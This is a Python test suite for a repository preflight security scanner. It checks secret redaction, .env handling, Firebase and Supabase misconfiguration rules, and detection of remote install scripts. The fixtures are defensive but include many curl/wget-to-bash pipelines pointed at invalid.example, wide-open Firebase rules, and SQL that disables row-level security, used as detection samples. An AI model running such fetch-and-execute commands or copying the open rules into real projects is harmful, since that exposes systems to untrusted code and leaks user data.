from __future__ import annotations

import base64
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import types
import unittest
from unittest import mock


REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
SCANNER = REPOSITORY_ROOT / "skill" / "vibeworthy" / "scripts" / "preflight.py"


def load_scanner_module() -> types.ModuleType:
    module_name = "vibeworthy_preflight_test_module"
    specification = importlib.util.spec_from_file_location(module_name, SCANNER)
    if specification is None or specification.loader is None:
        raise RuntimeError("scanner module could not be loaded")
    module = importlib.util.module_from_spec(specification)
    sys.modules[module_name] = module
    specification.loader.exec_module(module)
    return module


def make_root_guard(scanner: types.ModuleType, root: Path, *, root_is_file: bool = False) -> object:
    resolved = root.resolve(strict=True)
    return scanner.RootGuard(
        resolved,
        resolved,
        scanner._path_identity(scanner.os.lstat(resolved)),
        root_is_file,
    )


def synthetic_cloud_key() -> str:
    return ("AK" + "IA") + ("Q" * 16)


def synthetic_firebase_key() -> str:
    return ("AI" + "za") + ("A" * 35)


def synthetic_supabase_key(kind: str) -> str:
    return "sb_" + kind + "_" + ("b" * 28)


def synthetic_jwt(role: str) -> str:
    def segment(value: dict[str, str]) -> str:
        encoded = base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode("utf-8"))
        return encoded.decode("ascii").rstrip("=")

    return ".".join((segment({"alg": "HS256", "typ": "JWT"}), segment({"role": role}), "signaturesegment"))


def tree_digest(root: Path) -> dict[str, tuple[str, str]]:
    result: dict[str, tuple[str, str]] = {}
    for current, directories, files in os.walk(root, topdown=True, followlinks=False):
        directories.sort()
        files.sort()
        current_path = Path(current)
        for name in list(directories) + files:
            path = current_path / name
            relative = path.relative_to(root).as_posix()
            if path.is_symlink():
                result[relative] = ("symlink", os.readlink(path))
            elif path.is_file():
                result[relative] = ("file", hashlib.sha256(path.read_bytes()).hexdigest())
            elif path.is_dir():
                result[relative] = ("directory", "")
    return result


class RepositoryFixture:
    def __init__(self, case: unittest.TestCase, *, git: bool = True) -> None:
        self._temporary = tempfile.TemporaryDirectory()
        case.addCleanup(self._temporary.cleanup)
        self.base = Path(self._temporary.name)
        self.root = self.base / "project"
        self.root.mkdir()
        if git:
            subprocess.run(
                ["git", "init", "-q", str(self.root)],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=True,
            )

    def write(self, relative: str, content: str | bytes) -> Path:
        path = self.root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")
        return path

    def track(self, *relative_paths: str, force: bool = False) -> None:
        command = ["git", "add"]
        if force:
            command.append("--force")
        command.extend(("--", *relative_paths))
        subprocess.run(
            command,
            cwd=self.root,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )


class PreflightTests(unittest.TestCase):
    maxDiff = None

    def run_scanner(
        self,
        target: Path,
        output_format: str = "json",
        *extra: str,
        environment_overrides: dict[str, str] | None = None,
    ) -> subprocess.CompletedProcess[str]:
        environment = os.environ.copy()
        environment["PYTHONDONTWRITEBYTECODE"] = "1"
        if environment_overrides:
            environment.update(environment_overrides)
        return subprocess.run(
            [sys.executable, str(SCANNER), str(target), "--format", output_format, *extra],
            cwd=REPOSITORY_ROOT,
            env=environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            timeout=20,
        )

    def json_report(self, completed: subprocess.CompletedProcess[str]) -> dict[str, object]:
        self.assertEqual("", completed.stderr)
        return json.loads(completed.stdout)

    def test_req_010_all_formats_are_parseable_deterministic_and_read_only(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "# Synthetic clean project\n")
        fixture.track("README.md")
        before = tree_digest(fixture.root)

        first_json = self.run_scanner(fixture.root, "json")
        second_json = self.run_scanner(fixture.root, "json")
        text = self.run_scanner(fixture.root, "text")
        sarif = self.run_scanner(fixture.root, "sarif")

        self.assertEqual(0, first_json.returncode)
        self.assertEqual(first_json.stdout, second_json.stdout)
        report = self.json_report(first_json)
        self.assertEqual("1.0", report["schema_version"])
        self.assertEqual(0, report["exit_code"])
        self.assertEqual("none", report["release_assertion"])
        self.assertFalse(report["scope"]["git_history_scanned"])
        self.assertFalse(report["scope"]["submodules_scanned"])
        self.assertFalse(report["scope"]["atomic_snapshot"])
        self.assertTrue(report["scope"]["release_evidence_requires_quiescent_isolated_checkout"])
        self.assertFalse(report["scope"]["network_used"])
        self.assertFalse(report["scope"]["files_modified"])

        self.assertEqual(0, text.returncode)
        self.assertIn("Git history and submodule contents were not scanned", text.stdout)
        self.assertIn("non-atomic worktree view", text.stdout)
        self.assertIn("it is not GO", text.stdout)
        self.assertEqual("", text.stderr)

        self.assertEqual(0, sarif.returncode)
        sarif_document = json.loads(sarif.stdout)
        self.assertEqual("2.1.0", sarif_document["version"])
        self.assertEqual(0, sarif_document["runs"][0]["invocations"][0]["exitCode"])
        self.assertFalse(
            sarif_document["runs"][0]["invocations"][0]["properties"]["scope"]["atomic_snapshot"]
        )
        self.assertTrue(
            sarif_document["runs"][0]["invocations"][0]["properties"]["scope"][
                "release_evidence_requires_quiescent_isolated_checkout"
            ]
        )
        self.assertEqual(before, tree_digest(fixture.root))

    def test_req_007_matched_secret_is_redacted_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = synthetic_cloud_key()
        assignment_name = "access" + "_token"
        fixture.write("config.txt", f'{assignment_name} = "{synthetic_value}"\n')
        fixture.track("config.txt")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(synthetic_value, completed.stderr)
                self.assertIn("VW-SECRET-CLOUD-ACCESS-KEY", completed.stdout)
                self.assertIn("config.txt", completed.stdout)
                self.assertIn("rotate", completed.stdout.lower())

    def test_req_007_secret_like_filename_is_redacted_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "!DUMMY_SECRET_VALUE_123"
        filename = f"token={synthetic_value}"
        fixture.write(filename, f"token={synthetic_value}\n")
        fixture.write(
            "password" + ("A" * 129) + f"={synthetic_value}.txt",
            f"password={synthetic_value}\n",
        )

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(synthetic_value, completed.stderr)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_specialized_secret_filenames_are_redacted_in_every_format(self) -> None:
        cases = (
            ("NEXT_PUBLIC_ADMIN_KEY", "VW-CLIENT-PRIVILEGED-CREDENTIAL"),
            ("SUPABASE_SERVICE_ROLE_KEY", "VW-SUPABASE-PRIVILEGED-KEY"),
        )
        for variable_name, rule_id in cases:
            with self.subTest(variable_name=variable_name):
                fixture = RepositoryFixture(self)
                synthetic_value = "!PrivilegedSyntheticValue123456789"
                long_variable_name = (
                    "NEXT_PUBLIC_" + ("A" * 129) + "ADMIN_KEY"
                    if variable_name == "NEXT_PUBLIC_ADMIN_KEY"
                    else "SUPABASE_" + ("A" * 129) + "_SERVICE_ROLE_KEY"
                )
                fixture.write(
                    f"{variable_name}={synthetic_value}",
                    f"{variable_name}={synthetic_value}\n",
                )
                fixture.write(
                    f"{variable_name}=/{synthetic_value}",
                    f"{variable_name}={synthetic_value}\n",
                )
                fixture.write(
                    f"{long_variable_name}={synthetic_value}.txt",
                    f"{variable_name}={synthetic_value}\n",
                )

                for output_format in ("text", "json", "sarif"):
                    with self.subTest(output_format=output_format):
                        completed = self.run_scanner(fixture.root, output_format)
                        self.assertEqual(1, completed.returncode)
                        self.assertNotIn(synthetic_value, completed.stdout)
                        self.assertNotIn(synthetic_value, completed.stderr)
                        self.assertIn(rule_id, completed.stdout)
                        self.assertIn("REDACTED", completed.stdout)

    def test_req_007_detected_content_values_cannot_leak_through_other_paths(self) -> None:
        fixture = RepositoryFixture(self)
        values = ("FirstCorrelatedCredential12345", "SecondCorrelatedCredential67890")
        firebase = synthetic_firebase_key()
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
            'owner="app" approved-by="security" compensating-control="deny rules" '
            'expires="2099-01-01"'
        )
        fixture.write("config.env", f"password={values[0]}\nNEXT_PUBLIC_ADMIN_KEY={values[1]}\n")
        fixture.write(f"artifact-{values[0]}.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')
        fixture.write(f"artifact-{values[1]}.js", f'const firebaseApiKey = "{firebase}";\n')

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                for value in values:
                    self.assertNotIn(value, completed.stdout)
                self.assertIn("REDACTED", completed.stdout)
        report = self.json_report(self.run_scanner(fixture.root))
        warnings = [item for item in report["findings"] if item["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"]
        self.assertEqual(2, len(warnings))
        self.assertEqual(1, sum(item["suppressed"] for item in warnings))
        self.assertEqual(2, len({item["path"] for item in warnings}))

    def test_req_007_path_format_controls_are_escaped_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        format_control = "\u202e"
        firebase = synthetic_firebase_key()
        fixture.write(f"safe{format_control}.js", f'const firebaseApiKey = "{firebase}";\n')

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(0, completed.returncode)
                self.assertNotIn(format_control, completed.stdout)
                self.assertIn("202e", completed.stdout.lower())

    def test_req_011_git_scope_env_and_skip_reasons(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = synthetic_cloud_key()
        fixture.write(".gitignore", ".env.local\n")
        fixture.write(".env", "SAFE_NAME=placeholder\n")
        fixture.write(".env.local", f"IGNORED={synthetic_value}\n")
        fixture.write(".env.example", "TOKEN=placeholder\n")
        fixture.write("src/new.txt", "ordinary untracked source\n")
        fixture.write("vendor/dependency.txt", f"TOKEN={synthetic_value}\n")
        fixture.write("dist/bundle.js", f"TOKEN={synthetic_value}\n")
        fixture.write("asset.bin", b"\x00" + synthetic_value.encode("ascii"))
        fixture.write("large.txt", ("x" * 300) + synthetic_value)
        outside = fixture.base / "outside.txt"
        outside.write_text(f"TOKEN={synthetic_value}\n", encoding="utf-8")
        (fixture.root / "linked.txt").symlink_to(outside)
        fixture.track(".gitignore", ".env.example", "src/new.txt")
        fixture.track(".env", force=True)

        before = tree_digest(fixture.root)
        completed = self.run_scanner(fixture.root, "json", "--max-file-bytes", "128")
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        findings = report["findings"]
        by_rule = {finding["rule_id"]: finding for finding in findings}
        self.assertIn("VW-ENV-TRACKED", by_rule)
        self.assertEqual(".env", by_rule["VW-ENV-TRACKED"]["path"])
        reported_paths = {finding["path"] for finding in findings}
        self.assertNotIn(".env.local", reported_paths)
        self.assertNotIn(".env.example", reported_paths)
        self.assertNotIn("vendor/dependency.txt", reported_paths)
        self.assertNotIn("dist/bundle.js", reported_paths)
        self.assertNotIn("asset.bin", reported_paths)
        self.assertNotIn("large.txt", reported_paths)
        self.assertNotIn("linked.txt", reported_paths)
        skipped = report["summary"]["skipped_by_reason"]
        self.assertGreaterEqual(skipped["binary"], 1)
        self.assertGreaterEqual(skipped["generated-or-vendor"], 2)
        self.assertGreaterEqual(skipped["oversized"], 1)
        self.assertGreaterEqual(skipped["symlink"], 1)
        self.assertNotIn(synthetic_value, completed.stdout)
        self.assertEqual(before, tree_digest(fixture.root))

    def test_req_011_untracked_nonignored_env_is_distinct_from_template(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(".env.production", "VALUE=placeholder\n")
        fixture.write(".env.template", "VALUE=placeholder\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        env_findings = [finding for finding in report["findings"] if finding["rule_id"].startswith("VW-ENV-")]
        self.assertEqual(1, len(env_findings))
        self.assertEqual("VW-ENV-UNIGNORED", env_findings[0]["rule_id"])
        self.assertEqual(".env.production", env_findings[0]["path"])

    @unittest.skipIf(os.name == "nt", "Git magic path fixture uses POSIX filename semantics")
    def test_req_011_git_scope_uses_literal_pathspecs_for_magic_names_and_root(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("root.txt", "ordinary tracked source\n")
        magic_targets = [
            fixture.write(
                f":({magic})scope/config.txt",
                "pass" + f"word=!Synthetic{magic.title()}PathSecret123\n",
            ).parent
            for magic in ("literal", "icase", "glob")
        ]
        fixture.track("root.txt")

        root_completed = self.run_scanner(fixture.root)
        root_report = self.json_report(root_completed)
        self.assertEqual(1, root_completed.returncode)
        self.assertEqual("git-worktree", root_report["scope"]["mode"])
        self.assertEqual(4, root_report["summary"]["files_considered"])

        for magic_target in magic_targets:
            with self.subTest(target=magic_target.name):
                target_completed = self.run_scanner(magic_target)
                target_report = self.json_report(target_completed)
                self.assertEqual(1, target_completed.returncode)
                self.assertEqual([], target_report["tool_errors"])
                self.assertEqual(
                    {"VW-SECRET-GENERIC-ASSIGNMENT"},
                    {finding["rule_id"] for finding in target_report["findings"]},
                )
                self.assertEqual(
                    {"config.txt"},
                    {finding["path"] for finding in target_report["findings"]},
                )

    def test_req_007_long_secret_like_path_remainder_is_fully_redacted(self) -> None:
        scanner = load_scanner_module()
        secret = "!Synthetic" + "PathCredential123456789"
        raw_path = ("segment/" * 500) + f"password=/{secret}/tail.txt"

        self.assertGreater(len(raw_path), 4_000)
        self.assertLessEqual(len(raw_path), 4_096)
        started = time.perf_counter()
        safe_path = scanner._safe_display_component(raw_path)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.0, f"path redaction took {elapsed:.3f}s")
        self.assertNotIn(secret, safe_path)
        self.assertNotIn("tail.txt", safe_path)
        self.assertTrue(safe_path.endswith("password=[REDACTED]"))

        for raw_name in (
            "password" + ("A" * 129) + f"={secret}.txt",
            "NEXT_PUBLIC_" + ("A" * 129) + f"ADMIN_KEY={secret}.txt",
        ):
            with self.subTest(raw_name=raw_name[:24]):
                safe_name = scanner._safe_display_component(raw_name)
                self.assertNotIn(secret, safe_name)
                self.assertIn("[REDACTED]", safe_name)

    def test_req_008_contextual_backend_keys_and_privileged_key(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        publishable = synthetic_supabase_key("publishable")
        privileged = synthetic_supabase_key("secret")
        fixture.write(
            "src/config.ts",
            "\n".join(
                (
                    f'export const firebaseApiKey = "{firebase}";',
                    f'export const supabasePublishable = "{publishable}";',
                    f'const backendCredential = "{privileged}";',
                    "",
                )
            ),
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-FIREBASE-PUBLIC-API-KEY", rule_ids)
        self.assertIn("VW-SUPABASE-PUBLIC-KEY", rule_ids)
        self.assertIn("VW-SUPABASE-PRIVILEGED-KEY", rule_ids)
        self.assertEqual(2, report["summary"]["required_manual_checks"])
        for value in (firebase, publishable, privileged):
            self.assertNotIn(value, completed.stdout)
        firebase_finding = next(
            finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        )
        self.assertIn("external", firebase_finding["message"])
        self.assertIn("unverified", firebase_finding["message"])

    def test_req_008_legacy_supabase_roles_are_classified_without_echoing_jwt(self) -> None:
        fixture = RepositoryFixture(self)
        public_jwt = synthetic_jwt("anon")
        privileged_jwt = synthetic_jwt("service_role")
        fixture.write("keys.txt", f"anon={public_jwt}\nservice={privileged_jwt}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertEqual(
            {"VW-SUPABASE-PUBLIC-KEY", "VW-SUPABASE-PRIVILEGED-KEY"},
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(public_jwt, completed.stdout)
        self.assertNotIn(privileged_jwt, completed.stdout)

    def test_req_008_permissive_firebase_rules_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "rules_version = '2';\nservice cloud.firestore { match /{document=**} { allow read, write: if true; } }\n",
        )
        fixture.write("database.rules.json", '{"rules": {".read": true, ".write": "true"}}\n')
        fixture.write("database-tautology.rules", '{"rules": {".read": "true == true"}}\n')
        fixture.write(
            "storage.rules",
            "service firebase.storage { match /b/{bucket}/o { match /{allPaths=**} { "
            "allow read, write: if\n true; } } }\n",
        )
        fixture.write(
            "tautology.rules",
            "service cloud.firestore { match /{document=**} { allow read: if true == true; } }\n",
        )
        fixture.write(
            "double-negation.rules",
            "service cloud.firestore { match /{document=**} { allow read: if !!true; } }\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"]
        self.assertEqual(6, len(rule_findings))
        self.assertEqual(
            {
                "database-tautology.rules",
                "database.rules.json",
                "double-negation.rules",
                "firestore.rules",
                "storage.rules",
                "tautology.rules",
            },
            {finding["path"] for finding in rule_findings},
        )

    def test_req_008_firebase_tautology_scan_is_bounded_on_long_failure(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(
            Path("firestore.rules"),
            "firestore.rules",
            None,
            b"firestore.rules",
        )
        text = "allow read: if true" + (" " * 65_536) + "X"
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.0, f"Firebase rule scan took {elapsed:.3f}s")
        self.assertEqual([], findings)

    def test_req_008_firebase_whitespace_cannot_bypass_permissive_rule_scan(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow" + (" " * 65) + "read: if true;\n"
            "allow read: if true" + (" " * 513) + ";\n",
        )
        fixture.write(
            "database.rules.json",
            '{"rules": {".read"' + (" " * 65) + ": true}}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(3, len(findings))

    def test_req_008_firebase_comments_parentheses_and_string_spacing_are_normalized(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "// allow read: if true;\n"
            "/* allow write: if true; */\n"
            "allow /* operation */ read, write: if (((true))) // explanation\n"
            ";\n",
        )
        fixture.write(
            "database.rules.json",
            '{"url": "https://invalid.example/a/*literal*/", '
            '".read" /* explanation */ : "(( true   == true ))"}\n',
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(2, len(findings))
        self.assertEqual(
            {"database.rules.json", "firestore.rules"},
            {finding["path"] for finding in findings},
        )

    def test_req_008_firestore_rule_text_inside_string_is_not_executable(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow read: if resource.data.note == \"allow read: if true;\";\n"
            "allow update: if request.auth.token.note == \".read: true\";\n"
            "allow delete: if request.auth.token.note == \"allow write: if true;\";\n"
            "allow create: if true;\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual([4], [finding["line"] for finding in findings])

    def test_req_008_firebase_parenthesis_scan_is_unbounded_and_linear(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(
            Path("firestore.rules"),
            "firestore.rules",
            None,
            b"firestore.rules",
        )
        parentheses = 65_536
        text = "allow read: if " + ("(" * parentheses) + "true" + (")" * parentheses) + ";"
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.0, f"Firebase parenthesis scan took {elapsed:.3f}s")
        self.assertEqual(
            ["VW-FIREBASE-PERMISSIVE-RULE"],
            [finding.rule_id for finding in findings],
        )

        failed_findings: list[object] = []
        started = time.perf_counter()
        scanner._scan_text(candidate, text[:-1] + "X", failed_findings)
        failed_elapsed = time.perf_counter() - started
        self.assertLess(
            failed_elapsed,
            1.0,
            f"failing Firebase parenthesis scan took {failed_elapsed:.3f}s",
        )
        self.assertEqual([], failed_findings)

    def test_req_008_explicitly_disabled_supabase_rls_blocks(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "supabase/migrations/001_access.sql",
            "ALTER TABLE public.accounts\n  DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE public.profiles FORCE ROW LEVEL SECURITY;\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rls_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-SUPABASE-RLS-DISABLED"]
        self.assertEqual(1, len(rls_findings))
        self.assertEqual("supabase/migrations/001_access.sql", rls_findings[0]["path"])
        self.assertEqual(1, rls_findings[0]["line"])

    def test_req_008_supabase_rls_line_mapping_is_linear(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(
            Path("schema.sql"),
            "schema.sql",
            None,
            b"schema.sql",
        )
        statement_count = 20_000
        text = "ALTER TABLE t DISABLE ROW LEVEL SECURITY;\n" * statement_count
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.5, f"SQL rule scan took {elapsed:.3f}s")
        rls_findings = [
            finding
            for finding in findings
            if finding.rule_id == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual(statement_count, len(rls_findings))
        self.assertEqual(1, rls_findings[0].line)
        self.assertEqual(statement_count, rls_findings[-1].line)

    def test_req_008_sql_literals_comments_and_invalid_syntax_do_not_spoof_rls(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "schema.sql",
            "-- ALTER TABLE ignored DISABLE ROW LEVEL SECURITY;\n"
            "SELECT 'ALTER TABLE ignored DISABLE ROW LEVEL SECURITY';\n"
            "DO $body$ ALTER TABLE ignored DISABLE ROW LEVEL SECURITY; $body$;\n"
            'SELECT "ALTER TABLE ignored DISABLE ROW LEVEL SECURITY";\n'
            "ALTER /* reviewed */ TABLE public.accounts /* boundary */ DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE public.accounts * DISABLE ROW LEVEL SECURITY;\n"
            "CREATE TABLE no_implicit_claim(id bigint);\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [item for item in report["findings"] if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"]
        self.assertEqual([5], [item["line"] for item in findings])

    def test_req_008_firebase_or_true_and_database_variant_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "database.production.rules.json",
            '{"rules":{"items":{".read":"auth != null || true"}}}\n',
        )
        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertIn("VW-FIREBASE-PERMISSIVE-RULE", {item["rule_id"] for item in report["findings"]})

    def test_req_009_lockfile_conflict_and_install_script_are_visible(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "package.json",
            json.dumps(
                {
                    "name": "synthetic-project",
                    "private": True,
                    "scripts": {"postinstall": "node verify-install.js"},
                    "dependencies": {"left-pad": "1.3.0"},
                },
                indent=2,
            )
            + "\n",
        )
        fixture.write("package-lock.json", "{}\n")
        fixture.write("yarn.lock", "# synthetic\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-LOCKFILE-CONFLICT", rule_ids)
        self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
        self.assertNotIn("VW-LOCKFILE-MISSING", rule_ids)

    def test_req_009_missing_lock_and_remote_install_are_reported(self) -> None:
        fixture = RepositoryFixture(self)
        remote_command = (
            ("cu" + "rl")
            + " https://invalid.example/tool "
            + "|"
            + " /bin/"
            + ("ba" + "sh")
        )
        fixture.write(
            "package.json",
            json.dumps(
                {
                    "name": "synthetic-project",
                    "scripts": {"install": remote_command},
                    "dependencies": {"package": "1.0.0"},
                },
                indent=2,
            )
            + "\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-LOCKFILE-MISSING", rule_ids)
        self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
        self.assertIn("VW-REMOTE-INSTALL-SCRIPT", rule_ids)

    def test_req_009_remote_install_wrappers_and_multiline_pipelines_block(self) -> None:
        fixture = RepositoryFixture(self)
        first_fetcher = "cu" + "rl"
        second_fetcher = "wg" + "et"
        shell = "ba" + "sh"
        fixture.write(
            "install.sh",
            f"{first_fetcher} https://invalid.example/one | env {shell}\n"
            f"{second_fetcher} https://invalid.example/two |\n {shell}\n"
            f"{first_fetcher} https://invalid.example/three | command {shell}\n"
            f"{second_fetcher} https://invalid.example/four | \\\n {shell}\n"
            f"{first_fetcher} 'https://invalid.example/five?a=1&b=2' | {shell}\n"
            f"{second_fetcher} https://invalid.example/six | sudo -u root {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual(6, len(findings))
        self.assertEqual({1, 2, 4, 5, 7, 8}, {finding["line"] for finding in findings})

    def test_req_009_nested_fragment_and_windows_remote_pipelines_block(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "nested.sh",
            f"{fetcher} https://invalid.example/install#fragment | {shell}\n"
            f"sh -c '{fetcher} https://invalid.example/install | {shell}'\n"
            f'result="$({fetcher} https://invalid.example/install | {shell})"\n'
            f"{fetcher}.exe https://invalid.example/install | {shell}.exe\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({1, 2, 3, 4}, {finding["line"] for finding in findings})

    def test_req_009_shell_c_text_is_only_scanned_when_the_shell_executes(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        nested = f"{fetcher} https://invalid.example/install | {shell}"
        fixture.write(
            "commands.sh",
            f"echo sh -c '{nested}'\n"
            f"printf '%s' sh -c '{nested}'\n"
            f"echo safe; sh -c '{nested}'\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual([3], [finding["line"] for finding in findings])

    def test_req_009_shell_redirections_options_substitutions_and_windows_forms_block(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        nested = f"{fetcher} https://invalid.example/install | {shell}"
        fixture.write(
            "variants.sh",
            f"{fetcher} https://invalid.example/redirect 2>&1 | {shell}\n"
            f"env -- {shell} --rcfile synthetic.rc --noprofile -O extglob -c -- '{nested}'\n"
            f"cat <({nested})\n"
            f"cat >({nested})\n"
            f'"C:\\Tools\\{fetcher}.exe" https://invalid.example/windows | '
            f'"C:\\Tools\\{shell}.exe"\n'
            f"C:\\Tools\\{fetcher}.exe https://invalid.example/windows-unquoted | "
            f"C:\\Tools\\{shell}.exe\n"
            f'cmd.exe /c "{fetcher}.exe https://invalid.example/cmd | {shell}.exe"\n'
            f'echo "<({nested})"\n'
            f"printf '%s' '{nested}'\n"
            f"echo {'x' * 10_000} {nested}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({1, 2, 3, 4, 5, 6, 7}, {finding["line"] for finding in findings})
        self.assertNotIn(
            "VW-SHELL-PIPELINE-UNPARSED",
            {finding["rule_id"] for finding in report["findings"]},
        )

    def test_req_009_execution_wrappers_block_without_treating_data_as_shell(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "s" + "h"
        nested = f"{fetcher} https://invalid.example/install | {shell}"
        fixture.write(
            "wrappers.sh",
            f'env -S \'{shell} -c "{nested}"\'\n'
            f'env --split-string=\'{shell} -c "{nested}"\'\n'
            f"eval '{nested}'\n"
            f"{fetcher} https://invalid.example/busybox | busybox {shell}\n"
            f"{fetcher} https://invalid.example/nohup | nohup {shell}\n"
